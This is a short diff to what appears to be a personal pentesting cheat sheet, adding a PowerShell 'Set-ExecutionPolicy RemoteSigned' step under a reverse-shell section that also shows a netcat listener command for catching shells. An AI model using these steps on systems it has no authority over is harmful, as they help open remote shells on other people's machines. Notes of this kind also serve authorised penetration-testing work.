@@ -29,6 +29,12 @@ Many of The Stuff presented here May/May-not work for you, this is more of a per
 
 ## ReverseShell (PowerShell) -
 
+### Run Any Script-
+
+```
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
+```
+
 ### Listener (Linux Recomended)-
 ```
 sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
